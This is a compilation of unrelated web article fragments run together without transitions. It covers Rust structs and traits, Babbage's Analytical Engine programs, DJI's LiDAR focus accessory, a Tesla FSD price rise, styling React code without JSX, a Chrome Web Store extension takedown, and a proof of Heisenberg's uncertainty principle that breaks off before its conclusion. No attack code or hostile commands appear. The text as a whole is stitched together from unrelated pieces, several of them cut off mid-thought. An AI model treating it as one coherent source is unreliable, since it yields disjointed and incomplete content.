	<span>pub</span> <span>fn</span> <span>init</span><span>(</span>x<span>:</span><span>f32</span><span>,</span> y<span>:</span><span>f32</span><span>,</span> z<span>:</span><span>f32</span><span>)</span><span>-&gt;</span> <span>MyData</span><span>{</span>
	
		
		<span>MyData</span><span>{</span>
			x<span>,</span>
			y<span>,</span>
			z<span>,</span>
		<span>}</span>
	<span>}</span>
<span>}</span></pre>
<p> <em>"Okay, separate <code>impl</code> blocks seem like a weird choice. Kinda reminds me of <code>C</code> header files..."</em></p>
<p> Calling methods defined in types is done with a <code>C++</code> like syntax, e.g. <code>Type::method_name()</code>. However, once an instance exists (aka memory has been allocated), members are accessed with regular dot syntax, e.g. <code>instance.method_name()</code>:</p>
<pre><span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
    <span>let</span> position <span>=</span> <span>MyData</span><span>::</span><span>init</span><span>(</span><span>0.0</span><span>,</span> <span>1.0</span><span>,</span> <span>0.0</span><span>)</span><span>;</span> 
    
    <span>let</span> y <span>=</span> position<span>.</span>y<span>;</span> 
<span>}</span></pre>
<p><strong>There's no inheritance. Shared behaviours are defined in <code>Traits</code>.</strong></p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span> 
    <span>pub</span> y<span>:</span> <span>f32</span><span>,</span>
    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>


<span>trait</span> <span>Drawable</span> <span>{</span>
    <span>fn</span> <span>draw</span><span>(</span><span>&amp;</span><span>self</span><span>)</span><span>;</span>
<span>}</span>


<span>impl</span> <span>Drawable</span> <span>for</span> <span>MyData</span> <span>{</span>
	
	
	
    <span>fn</span> <span>draw</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>{</span>
        
    <span>}</span>
<span>}</span></pre>
<p><em>"Okay, so like <code>Trait</code> is just a different way to spell <code>Interface</code>? Gotcha. But no inheritance? That's pretty wild. But composition over inheritance, am I right?"</em></p>
<p>Now that we've implemented the <code>Drawable</code> Trait, we can call its methods on our struct: </p>
<pre><span>let</span> position <span>=</span> <span>MyData</span><span>::</span><span>init</span><span>(</span><span>0.0</span><span>,</span> <span>1.0</span><span>,</span> <span>0.0</span><span>)</span><span>;</span>

position<span>.</span><span>draw</span><span>(</span><span>)</span><span>;</span> </pre>
<p>That's enough for now, but know there are other plenty of other commendable <a href="https://stevedonovan.github.io/rust-gentle-intro/2-structs-enums-lifetimes.html" target="_blank" rel="nofollow noopener noreferrer">type features</a>, some of which we'll discuss later.</p>
<h2 id="where-the-functional-rubber-meets-the-road">Where the Functional Rubber Meets the Road</h2>
<p>Giant monolithic classes are considered a code smell. A signal that responsibilities need to be separated into separate concerns. Still, OOP maintains the feeling of discrete units. Data and behaviour are contained within the cell walls of the class, or at least within the inheritance chain.   </p>
<p>Rust, by comparison, feels inside out, "itty bitty" and piecemeal. What might have been a single class is instead an accumulation of structs and traits, each defining their own narrow window into data and behaviour. <a href="https://www.infoq.com/presentations/Simple-Made-Easy/" target="_blank" rel="nofollow noopener noreferrer">In this talk</a>, the creator of Clojure, another functional language, describes this quality as "ad-hoc polymorphism". Using only what you need, when you need it. This granular approach maximises the immutable surface area, mutability is limited to where it's necessary.   </p>
<p>In the flame wars of "was OOP a giant mistake?", it's debatable whether <a href="https://stevedonovan.github.io/rust-gentle-intro/object-orientation.html" target="_blank" rel="nofollow noopener noreferrer">Rust allows you to write OOP code</a>. I understand this now not as a wholesale rejection: abstraction and encapsulation remain necessary tools. However, Rust forces you to leave behind features ardents consider harmful, inheritance being the obvious example. Call it "OOP, the good bits" if you will. </p>
<p>Ideas like composition over inheritance or separating data from behaviour have been around for a long time within the OOP world. However, FP encourages new principles, determinism and the avoidance of side effects. Let's look at an example. </p>
<h3 id="fixing-the-billion-dollar-mistake">Fixing the Billion Dollar Mistake</h3>
<p>Tony Hoare, the inventor of the null pointer called it <a href="https://en.wikipedia.org/wiki/Tony_Hoare#Apologies_and_retractions" target="_blank" rel="nofollow noopener noreferrer">his billion-dollar mistake</a>. Any programmer knows the misery of finding an error log littered with <code>Null Reference Exception</code>. But <code>null</code> values are fundamental, like the oxygen we breathe. Whenever I tried to contemplate an alternative I suffered a failure of imagination. <em>"No null values? Far out man."</em> </p>
<p>For a while, in prior languages, I attempted to answer this question by initialising variables with a default value instead of <code>null</code>. That worked when the default value meant something, otherwise, it just piped junk data into the system. Still, in successful cases, I began to appreciate the guarantee  it offered. Any downstream code could trust a variable would be valid and not have to muddy itself with unexpected exceptions.</p>
<p>Software is such that, unfortunately, there will always be cases where initialisation or access of a resource fails. FP provides us with a more complete answer here. It …</p></div></div>

<!-- %h3 About -->
<p>The mathematician and inventor Charles Babbage wrote 26 programs between 1836 and 1841 for the unfinished "Analytical Engine" (AE). The code is embedded implicitly in tables summarizing program traces. In this talk, I present the programming architecture of Babbage’s mechanical computer based on the first code written for the machine. The AE had a processor separate from memory, and worked using a kind of dataflow approach. The stream of arithmetical operations was independent from the stream of memory addresses. Special "combinatorial" cards allowed the processor to execute FOR and WHILE loops. Combinatorial cards also allowed independent looping through the stream of memory addresses. Quite sophisticated computations were possible and illustrate why Babbage talked about the possibility of doing "algebra" with his machine. The programs I will discuss predate by several years the account published by Menabrea in 1842 and translated later by Lady Lovelace with notes of her own.</p>

<p>DJI has a 3D focus accessory for the <a href="https://www.bhphotovideo.com/c/product/1585352-REG/dji_cp_rn_00000094_01_rs_2_gimbal_stabilizer.html/BI/20068/KBID/13800/" target="_blank" rel="noopener noreferrer">DJI RS 2</a> that allows you to autofocus any manual lens using LiDAR using what is called time of flight technology. The technology has a few limitations like it won’t autofocus beyond 4m (22ft) because there aren’t enough photons bouncing back at that distance and the system has to be calibrated for each lens. The system also won’t work with lenses that do not have a hard stop.</p>
<p>The system is pretty basic at this time and it is dumb zone AF, but this might be improved with time. The follow focus seems to work best between 1m and 4m from testing and the calibration program, which checks two distances during calibration. The gimbal can store profiles for 3 lenses so you do not have to repeat calibration every time. AF is handled completely independently of the camera and the lens is focused via <a href="https://www.bhphotovideo.com/c/product/1078023-REG/slr_magic_slr_3595m_cine_ii_e_35mm_0_95_ii_m.html/BI/20068/KBID/13800/" target="_blank" rel="noopener noreferrer">gears</a> so it will focus even with the camera off and since it uses LiDAR it will even focus in the dark. DJI also makes an accessory to <a href="https://www.bhphotovideo.com/c/product/1447215-REG/dji_cp_rn_00000026_01_ronin_s_part_19_focus.html/BI/20068/KBID/13800/">add gears to your manual focus lenses</a>.</p>
<p>The 3D focus module isn’t available yet, but it will be in a few weeks for $169 and it requires the <a href="https://www.bhphotovideo.com/c/product/1585352-REG/dji_cp_rn_00000094_01_rs_2_gimbal_stabilizer.html/BI/20068/KBID/13800/" target="_blank" rel="noopener noreferrer">focus motors and RS2</a>, but not the Ravens Eye wireless transmitter that was used in the video. If you want the setup to track you then you will need the Ravens Eye wireless transmitter. This system also makes older cameras with poor AF relevant again, which is a nice bonus.</p>

<p>Tesla CEO just announced on Twitter that the Full Self-Driving (FSD) package price will go up by $2,000 starting Monday next week. This price hike is going to set the FSD cost at an staggering $10,000.</p>



<p>In the past, Musk has warned that because of the increase in valuation of the FSD software with the passage of time, Tesla owners will have to pay more to enjoy this futuristic technology. </p>



<figure><div>
<amp-twitter width="600" height="480" layout="responsive" data-tweetid="1319164198241341440" data-width="550" data-dnt="true" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><blockquote data-width="550" data-dnt="true" placeholder=""><p lang="en" dir="ltr">Now that Tesla FSD beta is out in limited release, FSD price (new or upgrade) will go up by ~$2k on Monday</p>— Elon Musk (@elonmusk) <a href="https://twitter.com/elonmusk/status/1319164198241341440?ref_src=twsrc%5Etfw">October 22, 2020</a></blockquote></amp-twitter>
</div></figure>



<p>As <a href="https://www.teslaoracle.com/tag/full-self-driving/">Tesla FSD</a> software gains more and more confidence in roaming the city streets, the $10k price tag might seem affordable in the future. And with the advent of Tesla Robotaxis where the car makes money for you in its free time, the cost will be fully justifiable.</p>



<h2>FSD Beta wide-release</h2>



<div>
<div>
<p>During last evening’s Q3 2020 Earnings Call, Elon Musk also said that the wide-release of FSD Beta will start rolling out at the end of this year. Currently, this specific software release is limited to drivers and owners who are deemed ‘safe and responsible’ by Tesla.</p>



<p><a href="https://www.teslaoracle.com/topic/elon-musk/">Elon Musk</a> also said that the wide-release of the FSD Beta this year depends on how much safe this update proves itself in the coming weeks and months of testing.</p>
</div>




</div>



<p>In response to some other questions regarding the worldwide release of FSD beta this year, Elon Musk said that it’s a long process to meet all the regulatory approvals and countries like the UK have Right-Hand-Drive cars, that’s also a challenge to meet.</p>



<figure><div>
<amp-twitter width="600" height="480" layout="responsive" data-tweetid="1319159425995857921" data-width="550" data-dnt="true" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><blockquote data-width="550" data-dnt="true" placeholder=""><p lang="en" dir="ltr">As soon as we complete testing &amp; regulators approve. So many different traffic signs, rules &amp; languages around world, not to mention driving on left side of road! Also, a long &amp; challenging road lies ahead getting to high 9’s reliability (way beyond human).</p>— Elon Musk (@elonmusk) <a href="https://twitter.com/elonmusk/status/1319159425995857921?ref_src=twsrc%5Etfw">October 22, 2020</a></blockquote></amp-twitter>
</div></figure>



<p>Musk also agreed to a suggestion that the price change should currently only take effect in the United States. As in Europe and other countries, the Full Self-Driving phenomenon has yet to go through many obstacles that Elon Musk himself described in the above tweet.</p>



<figure></figure>



<p>Given the hype and excitement around yesterday’s FSD Beta limited-release and the upcoming price hike in a few days, Tesla will be able to sell a sizable number of Full Self-Driving packages before Monday.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><strong>TL;DR:</strong> <em>From a code aesthetic perspective, a combination of Hyperscript and CoffeeScript is an excellent way of writing beautiful React code.</em></p>
<p>React code is ugly. I’m not talking about any technical trait of the framework; I’m talking playing aesthetics, how the code looks on my screen, and the feelings it evokes.</p>
<p>Code aesthetics, in this sense, is not something developers are used to caring about. We have more important worries. Aesthetics are subjective, hard to measure and the benefits of chasing it are unclear. It is not often you’ll see a developer raising their hand and the midst of a Stand-up meeting to tell their peers they’re not pleased with how the code looks on their screen. And I’m not sure someone should, but I'm coming from a different perspective.</p>
<p>My considerations about React’s beauty started when working on a side-project. As most coders with coding as their profession and hobbies, the difference between work and leisure is simply defined by the amount of pleasure you take. Of course, we aim our careers at making both undistinguishable, and though sometimes they are, when they’re not, you still want at least your "coding for relaxation" hours to be as pleasant as possible.</p>
<p>Naturally, if, for some reason, React is unpleasant to me, and I want to spend time coding for pleasure, the obvious thing to do is not to use React. And I don’t, most of the time. But code, as we know, has a multifaceted perspective: you have code, the artifact, lines full of symbols you input to the computer, but you also have the result of your code, its output, the real-life implication of the ideas you expressed using a programming language. And I care, and I can derive equal or even greater pleasure from seeing my code interact with the real world.</p>
<p>The consequence is that sometimes, although I might find one programming language, or framework, or tool, unpleasant to see or use, it is the one I need to see my code taking the shape of something real in a reasonable time. Maybe this is due to some tooling, the big community creating things around it, or some other technical trait. Regardless of the reason, my coding-as-a-hobby time is scarce, and although I want it to be enjoyable, I also want to make the best of it, which means using things that do not always comply with my aesthetic standards. This is the case with React.</p>
<p>While reflecting on this topic one day, a question arose: Can I write React code that is aesthetically delightful while still keeping my productivity high? I know there are tremendously valuable answers to this question out there in the way of other programming languages and frameworks. All of those will have varying degrees of the same trade-offs, like how hard it is to learn, how much can I still benefit from the React ecosystem, how is the tooling around it, and so on. And all those trade-offs need to be measured differently depending on the project’s objective.</p>
<p>My answers to this question are more often than not something else that not React. But every once in a while, you compare every trade-off; you look at your project from different perspectives; you try to rethink the features you envisioned and the requirements you had; and still, at the end of the day, React will be your answer. With those cases in mind, I reframed the original question to: "how far can I go to make my React code more pleasing to view while still keeping it React code?"</p>
<blockquote>
<p>"How far can I go to make my React code more pleasing to view while still keeping it React code?"</p>
</blockquote>
<p>To start answering the question, I created a Create React App project with a simple React code as a reference. I wanted it to have at least a bit of real-lifeless but still be simple enough, so it wouldn't get in the way of testing different things. I chose the official React tutorial code, which you can find here: <a target="_blank" href="https://codepen.io/gaearon/pen/gWWZgR?editors=0010">Tic Tac Toe</a>.</p>
<p>Zooming on the simplest React component on that piece of code, the Square component, we see the following:</p>
<pre><code><span><span>function</span> <span>Square</span>(<span>props</span>) </span>{
  <span>return</span> (
    <span><span>&lt;<span>button</span> <span>className</span>=<span>"square"</span> <span>onClick</span>=<span>{props.onClick}</span>&gt;</span>
      {props.value}
    <span>&lt;/<span>button</span>&gt;</span></span>
  );
}
</code></pre>
<p>And this is the point where things get subjective: I find this code unpleasant. Again I’m not talking about the technical attributes of this code. When I say it is ugly, I’m trying to express a set of feelings it evokes in me, which are heavily based on my own experience of the world in general and programming specifically. It is from this perspective that I'll move on to say that the first problem that screams to me is JSX.</p>
<p>A lot has been discussed about JSX since its introduction, but I'll allow myself a quick consideration of it for the sake of elucidating my point. JSX is messy, but it is also a reality. It comes from a natural evolution of front-end technologies, which have since their beginning some form of XML language to define markup. What makes it different is that JSX usually lives inside your javascript code.</p>
<p>Making a rough comparison with spoken languages, JSX is as if the speakers of a particular language started using a whole set of words and expressions from other languages to express themselves. This frequently happens when a specific subject is innate to a given culture, for example. When people outside that culture, speakers of a different language, face that challenge of expressing ideas about that subject, they'll often lack the vocabulary to deal with it, recurring to the language spoken by those who "gave birth" to the topic as a way to solve it. Language purists soon get angry and point out how you could say those things without the need for imported words. But people would still use those words, and some of those words will eventually be incorporated into the official language. JSX was born from the need for Javascript speakers to express UI markup.</p>
<p>Following the language speakers' analogy, a few souls use the language for aesthetic purposes and a means of self-expression. It is generally the case for poets and literary writers. How do they look at foreign language words? Well, they’ll undoubtedly see them differently. Their perspective is analogous to my view here, as it looks at language from its power to express ideas while also considering it aesthetically. From this perspective, the use of JSX is unnecessary: it adds noise and does not contribute to the expression of the ideas it expresses. </p>
<p>All of this is to say my first step towards a more pleasant way of writing React was to get rid of JSX. </p>
<p>The no JSX version of the button component looks something like this:</p>
<pre><code><span>const</span> e = React.createElement;
<span><span>function</span> <span>Square</span>(<span>{ onClick, value }</span>) </span>{
  <span>return</span> e(<span>'button'</span>, { <span>className</span>: <span>'square'</span>, onClick }, value);
}
</code></pre>
<p>The uniformity and conciseness of the code make for a substantial aesthetic improvement. And we can go further in the no-JSX road. I’m far from being the first person discussing JSX adoption. And hating it is probably as old as JSX itself. I bet the original team behind it had someone saying at least that it was unnecessary. You’ll find plenty of reading on reasons why JSX is terrible and the benefits of not using it. Gladly, you’ll also find technically sound alternatives to it. A prominent one is Hyperscript, which is recommended by the React team <a target="_blank" href="https://reactjs.org/docs/react-without-jsx.html">in their docs</a>. It is a simple tool that helps you build hypertext using javascript. Its React version brings a more attractive API then <code>createElement</code> gives us. I decided to try it out together with a tiny library of helpers called <code>hyperscript-helpers</code>, and I found that those tools contribute to the code aesthetic quite nicely:</p>
<pre><code><span><span>function</span> <span>Square</span>(<span>{ onClick, value }</span>) </span>{
  <span>return</span> button({ <span>className</span>: <span>'square'</span>, onClick }, value);
}
</code></pre>
<p>Replacing JSX is the Pareto principle applied to the beautification of React code. Little effort, excellent result. A move everyone should definitely make if they want prettier React code.</p>
<p>Moving on with exploring ways of prettifying your React code in the framework's realm, I found a dead-end. While there are design patterns and simple conventions I could explore, those require assessing their technical implications on a case-by-case basis, and I was just looking for something more general. So the next step would need to be in the Javascript layer.</p>
<p>JavaScript is an extremely flexible language, a quality well known as its double-edged sword. It is also something that can be explored from an aesthetic perspective. There are many different ways you can write valid code, with significant stylistic differences and a few technical implications. Many tools will help you customize and enforce the stylistic choices you make, and between those, there's one much of my liking: <a target="_blank" href="https://standardjs.com/">StandardJS</a>. StandardJS is a tool for automating applying a collection of sensible coding style choices to your code. Of notable aesthetic implication between those choices is the exclusion of semicolons.</p>
<p>I find semicolons in JS code an unnecessary noise, and I'm happy taking the risks that come from not using them. After I incorporated StandardJS into my reference example, I was left with the following:</p>
<pre><code><span>function</span> Square ({ onClick, <span>value</span> }) {
  <span>return</span> button({ className: <span>'square'</span>, onClick }, <span>value</span>)
}
</code></pre><p>Now in terms of javascript code, this was the best I could get. And looking back to what I had done so far, things were looking ok. The changes implemented were straightforward and could easily be integrated into my default side-project React setup. On the other hand, this was still aesthetically far from what I experienced in different languages. I've discussed the case for other languages already, and the point was I wanted to stick with React in a JS world. Unless there would be something that adds some sparkles of elegance to javascript while still being just like javascript, I’d be too far off the boundary I had set.</p>
<p>“Just like javascript.” While trying to stretch my creativity to look for different possibilities, this phrase made me travel back ten years in time. I was learning web development and had just come across Ruby on Rails. At the time, Rails …</p></div></div>

              After 3 months of trying everything I could think of, I give up.
              I don’t think I will ever develop anything for the Google
              ecosystem again. I’m not angry, I’m not doing this out of spite.
              I just don’t think it is worth it to invest any amount of effort
              to build something on a platform that turned out to be so
              unreliable.
            </p>  <h2>Please scroll down to read the latest update.</h2>  <p>
              I started developing my first extension back in 2010, when Apple
              finally decided to implement proper extension support in Safari.
              Exciting times. I spent a weekend writing my first Safari
              Extension, an ad blocker called “Cleaner Facebook”. I must
              confess it was ugly, and by today’s standards, very poorly
              written, but it did the job.
            </p> <p>
              After a few weeks while browsing Facebook using Chrome, the
              annoying ads popped up and I figured that it’ll be worthwhile to
              port it over, so I did. I also made it available to everyone via
              <a href="http://apps.graffino.com/" target="_blank" title="App Development">Graffino’s apps playground.</a></p> <p>
              Months later the due to some policy changes in Chrome, I moved
              to the Chrome Web Store where I made it available for free under
              the name “Cleaner Facebook”.
            </p> <p>
              What happened next was beyond my wildest expectations. It
              quickly gathered around 4.000 users and over the last year it
              surged to 24.000+ users. Whenever I pushed an update, the
              numbers would spike.
            </p> <p>
              I got quite a few offers to sell it, so others could push
              advertising through it. Thing is, I never wanted to make any
              money off it and I felt like I was betraying my users. So, I
              kept it and improved it constantly. It worked so well because I
              needed it to work well, I was using it daily and my users loved
              it. It got a 5 stars rating and over 85 reviews.
            </p> <blockquote>
              Google has been notified that some of your materials allegedly
              infringe upon the trademarks of others.
            </blockquote> <p>
              At the end of May this year, I received an email from Google
              telling me that my extension violated Facebook’s trademark and
              got taken down. There was no information how to solve the issue,
              no way to appeal. Google washed its hands clean and directed all
              inquiries to an automatically generated email address. This
              email address was a black hole that never responded to any of my
              emails.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/bcfd01f.png" alt="Google's notification that they removed Graffino's Ads removal app from the store."> <figcaption>
                The original infringement and taken down notice (shortened).
              </figcaption></figure> <p>
              I figured out that the name might be an issue although there
              were
              <a href="https://chrome.google.com/webstore/search/facebook?hl=en-US" target="_blank">a lot of other extensions</a>
              with the same name in the store. Even so, I changed the name of
              my extension to “Cleaner — for Facebook” and resubmitted it to
              the store where it got placed “In review”.
            </p> <p>
              Over the next weeks I never received any email from the Chrome
              Store other than the initial take down notice. When I logged in
              again, I found my extension was still “Taken down” and the “In
              review” flag gone.
            </p> <p>
              I went on to search for a Developer Support page, but after half
              an hour of searching I found out that there is none. There is no
              support whatsoever for the developer besides Google’s own
              documentation. If you encounter an issue that you can’t solve
              yourself, you’re stranded. There’s no contact info. No one to
              write to.
            </p> <p>
              After getting really frustrated that day, I vented out sending
              out a nasty email to removals@google.com. Not sure it helped.
            </p> <p>
              The next day I poked around and found a support form intended
              for Chrome Web Store users. In my desperation I figured this was
              my only option left.
            </p> <p>
              About a week later, I got my first reply from <em>Google</em>.
              Although it sounded nice, it wasn’t really helpful. Most
              probably due to the fact it was a canned response, totally
              unrelated to my issue.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/a38f41d.png" alt="Google's first email response to Graffino's complaint."> <figcaption>First canned response</figcaption></figure> <p>
              Later that day, I fired a few other emails, telling them that my
              extension was not under review and the cause for the take down
              was not flagging. I also submitted another message via the
              support form I used before. My requests got closed with a
              <em>“Thanks for your feedback.”</em> canned response.

              Meanwhile my extension’s user base was dwindling, and I could do
              absolutely nothing about it.

                July.
              </figcaption></figure> <p>
              After another two weeks I finally gave up and sent this final
              email. I got a reply that my case was “Reopened”. It’s been a
              month and I didn’t hear back since, so I don’t think I will ever
              get my extension back on the store.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/3e2eaf4.png" alt="Google's first email response to Graffino's complaint."> <figcaption>Final email from my side.</figcaption></figure> <p>
              I’m not playing the victim here, and I don’t expect this post to
              solve anything for my extension. I just want you to think twice
              before creating a revenue stream based on the Chrome Web Store.
            </p> <p>
              Google has great automated tools and services, to help
              developers ramp up and deliver their apps to users quickly and
              painless. Most of the time these tools work perfectly. The
              problems arise when they don’t.
            </p> <p>
              I have never experienced such frustration, and such feelings of
              helplessness from any other major player out there. A similar
              issue with the
              <a href="https://safari-extensions.apple.com/details/?id=com.graffino.cleaner-for-facebook-86755BRK69" target="_blank">“Cleaner Facebook” Safari extension”</a>, got promptly solved by Apple in under three days.
            </p> <p>
              Google has a record of very bad user support. Basically, if your
              issue is not listed in the “Support Forums” you’re screwed. If I
              would have based my business on the Chrome Web store, I would be
              out of business by now.
            </p>  <h2>Update 8.09.2016</h2> <p>
              I never imagined this would generate this amount of attention:
              featured by
              <strong>Medium, 100k+</strong> views, heated discussions on
              <a href="https://www.reddit.com/r/programming/comments/51mgix/how_google_obliterated_my_4_year_old_chrome/" target="_blank">Reddit</a>
              or
              <a href="https://news.ycombinator.com/item?id=12442048" target="_blank">Hackernews</a>. I don’t really expect this to change anything for me, but I’m
              glad people are speaking up. If Google would implement a paid
              support option like Apple does for its developers, I’m sure a
              lot of pain would be avoided.
            </p> <p>
              I try to read everything, but I don’t respond on Medium (hate
              the commenting system), but you can ping me on Twitter.
            </p> <h2>To answer the most common questions:</h2> <p>1.<em> “Why don’t you change the name completely?”</em></p> <p>
              Well, because using “for Facebook” in the name is considered
              <a href="http://www.inta.org/TrademarkBasics/FactSheets/Pages/FairUse.aspx" target="_blank">fair use</a>. Also, when managing an app or extension with that many users,
              you don’t really want to confuse the users by renaming it to a
              completely different thing over night. It’s also an extension
              that only works on Facebook. I might also be infringing with the
              icon.
            </p> <p>
              So, you see, I really need guidelines to do this. Again, my
              problem is with the way this was handled, not the takedown
              itself.
            </p> <p>
              2.
              <em>“The extension was taken down because it was blocking ads.”
              </em></p> <p>
              This is simply untrue. I don't believe I was intentionally
              targeted. I was simply unlucky enough to be targeted by
              automated tools. Even the way my requests were handled weren’t
              done with malicious intent by Google. I think I’m just an edge
              case for which their support tools aren’t equipped to deal with.
            </p> <h2>Update: 9.09.2016</h2> <p>
              I received an email from Google today in which they’re
              expressing their apologies about the incident. It seems that
              they cannot do anything for the current store entry until the
              original complainant retracts his complain.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/3e2eaf4.png" alt="Google's first email response to Graffino's complaint."> <figcaption>Final email from my side.</figcaption></figure> <p>
              They offered me clear options though. We’re currently assessing
              what the best option might be. As I said in the article, this
              wasn’t an intentional targeting but a slip-up of their support
              which they’re trying to fix.
            </p> <p>
              Hopefully I will have the time to write a follow-up once all
              this is over. I didn’t expect or wanted this kind of attention,
              these have been 2 stressful days for me, trying to keep up with
              all the requests and messages, as I do have a job and my own
              company to run.
            </p> <p>
              It also happens that today is my birthday. I guess receiving a
              response from Google was my birthday present :).
            </p>  <h2>Update: 10.09.2016</h2> <p>
              You can still find the
              <a href="http://apps.graffino.com/" target="_blank">ad blocker extension</a>
              here. However, you will not be able to run it. Chrome made
              changes so that extensions cannot be side-loaded without an
              enterprise profile.

      <h3 id="introduction">Introduction</h3>

<p>In quantum mechanics, one of the key discoveries is that it is not always possible that we could measure two physical observables precisely, which is the Heisenberg’s general uncertainty principle.</p>



<p>We might have learned a special case of the Heisenberg’s general uncertainty principle from high school or college physics courses that the more precisely the position of some particle is determined, the less precisely its momentum can be predicted from initial conditions, and vice versa. In this case, the two physical observables are position and momentum.</p>



<p>Formally, the Heisenberg’s general uncertainty principle states that the product of the variances of two arbitrary hermitian operators on a given state is always greater than or equal to one-fourth the square of the expected value of their commutator. In formulas:</p><p>

\[\mathbb{V}_{\psi}(\Omega_1) \mathbb{V}_{\psi}(\Omega_2) \geq \frac{1}{4} | \langle [\Omega_1, \Omega_2] \rangle_{\psi} | ^2\]

</p><p>where $\mathbb{V}_{\psi}(\Omega_1)$ and $\mathbb{V}_{\psi}(\Omega_2)$ are using the notations from my previous <a href="https://leimao.github.io/blog/Quantum-Mean-Variance/">post</a>, $[\Omega_1, \Omega_2]$ is called the commutator of $\Omega_1$ and $\Omega_2$, and $[\Omega_1, \Omega_2] = \Omega_1 \Omega_2 - \Omega_2 \Omega_1$.</p>



<p>In this blog post, I would like to show a mathematical proof to Heisenberg’s general uncertainty principle.</p>

<h3 id="prerequisites">Prerequisites</h3>

<p>We would use the following four theorems and properties to prove Heisenberg’s general uncertainty principle.</p>

<h4 id="cauchyschwarz-inequality">Cauchy–Schwarz Inequality</h4>

<p>The Cauchy–Schwarz inequality states that for all vectors $u$ and $v$ of an inner product space it is true that</p><p>

\[\langle u, u \rangle \langle v, v \rangle \geq | \langle u, v \rangle | ^ 2\]

</p><p>The proof could be found on <a href="https://en.wikipedia.org/wiki/Cauchy%E2%80%93Schwarz_inequality">Wikipedia</a>.</p>

<h4 id="imaginary-part-of-vector-inner-product">Imaginary Part of Vector Inner Product</h4>

<p>The imaginary part of the inner product of all vectors $u$ and $v$, $\text{Im}\big(\langle u, v \rangle\big)$, could be computed as</p><p>

\[\text{Im}\big( \langle u, v \rangle \big) = \frac{1}{2i} \big(\langle u, v \rangle - \langle v, u \rangle \big)\]

</p><p>Assuming $u = a_1 + b_1 i$ and $v = a_2 + b_2 i$, where $a_1$, $a_2$, $b_1$, and $b_2$ are real (column) vectors.</p><p>

\[\begin{align}
\langle u, v \rangle &amp;= v^{\dagger} u \\
&amp;= (a_2 + b_2 i)^{\dagger} (a_1 + b_1 i) \\
&amp;= (a_2^{\top} - b_2^{\top} i) (a_1 + b_1 i) \\
&amp;= (a_2^{\top} a_1 + b_2^{\top} b_1) + (a_2^{\top} b_1 - b_2^{\top} a_1) i \\ 
&amp;= \text{Re}\big(\langle u, v \rangle\big) + \text{Im}\big(\langle u, v \rangle\big) i\\
\end{align}\]

\[\begin{align}
\langle v, u \rangle &amp;= u^{\dagger} v \\
&amp;= (a_1 + b_1 i)^{\dagger} (a_2 + b_2 i) \\
&amp;= (a_1^{\top} - b_1^{\top} i) (a_2 + b_2 i) \\
&amp;= (a_1^{\top} a_2 + b_1^{\top} b_2) + (a_1^{\top} b_2 - b_1^{\top} a_2) i \\ 
&amp;= (a_2^{\top} a_1 + b_2^{\top} b_1) + (a_2^{\top} b_1 - b_2^{\top} a_1) i \\ 
&amp;= \text{Re}\big(\langle u, v \rangle\big) - \text{Im}\big(\langle u, v \rangle\big) i\\
\end{align}\]

</p><p>It is trivial to see that</p><p>

\[\text{Im}\big( \langle u, v \rangle \big) = \frac{1}{2i} \big(\langle u, v \rangle - \langle v, u \rangle \big)\]

</p><p>This concludes the proof.</p>

<h4 id="triangle-inequality">Triangle Inequality</h4>

<p>Let $z$ be any complex number, we have</p><p>

\[| z | ^2 \geq | \text{Im}(z) | ^2\]

</p><p>This should be very straightforward to the people who are familiar with triangles and know the polar coordinate expression of complex numbers. We will skip the formal proof here.</p>

<h4 id="hermitian-property">Hermitian Property</h4>

<p>If A is a hermitian $n$-by-$n$ matrix, then for all $u, v^{\prime} \in \mathbb{C}$. we have</p><p>

\[\langle Au, v \rangle = \langle u, Av \rangle\]

</p><p>Using the property of hermitian matrix $A^{\dagger} = A$, we simply have</p><p>

\[\begin{align}
\langle Au, v \rangle &amp;= v^{\dagger} Au \\
&amp;= v^{\dagger} A^{\dagger} u \\
&amp;= {(Av)}^{\dagger} u \\
&amp;= \langle u, Av \rangle
\end{align}\]

</p><p>This concludes the proof.</p>

<h3 id="proof-to-heisenbergs-general-uncertainty-principle">Proof to Heisenberg’s General Uncertainty Principle</h3>

<p>Because $\Delta_{\psi}(\Omega) = \Omega - \langle \Omega \rangle_{\psi} I$ and $\Omega$ is a hermitian operator, therefore $\Delta_{\psi}(\Omega)$ is also a hermitian operator. Based on <a href="https://leimao.github.io/blog/Quantum-Mean-Variance/">the definition of variance</a>, using the hermitian property, we further have</p><p>

\[\begin{align}
\mathbb{V}_{\psi}(\Omega) &amp;= \langle (\Delta_{\psi}(\Omega)) (\Delta_{\psi}(\Omega)) \rangle_{\psi} \\
&amp;= \langle (\Delta_{\psi}(\Omega)) (\Delta_{\psi}(\Omega))\psi, \psi \rangle \\
&amp;= \langle (\Delta_{\psi}(\Omega))\psi, (\Delta_{\psi}(\Omega)) \psi \rangle \\
\end{align}\]

</p><p>We apply the Cauchy–Schwarz inequality to the left side of the Heisenberg’s general uncertainty principle,</p><p>

\[\begin{align}
\mathbb{V}_{\psi}(\Omega_1) \mathbb{V}_{\psi}(\Omega_2) &amp;= \langle (\Delta_{\psi}(\Omega_1))\psi, (\Delta_{\psi}(\Omega_1)) \psi \rangle \langle (\Delta_{\psi}(\Omega_2))\psi, (\Delta_{\psi}(\Omega_2)) \psi \rangle \\
&amp;\geq | \langle (\Delta_{\psi}(\Omega_1))\psi, (\Delta_{\psi}(\Omega_2))\psi \rangle | ^ 2
\end{align}\]

</p><p>We further apply the Triangle inequality,</p><p>

\[\begin{align}
\mathbb{V}_{\psi}(\Omega_1) \mathbb{V}_{\psi}(\Omega_2) &amp;\geq | \langle (\Delta_{\psi}(\Omega_1))\psi, (\Delta_{\psi}(\Omega_2))\psi \rangle | ^ 2 \\
&amp;\geq \big| \text{Im}\big( \langle (\Delta_{\psi}(\Omega_1))\psi, (\Delta_{\psi}(\Omega_2))\psi \rangle \big) \big| ^ 2
\end{align}\]

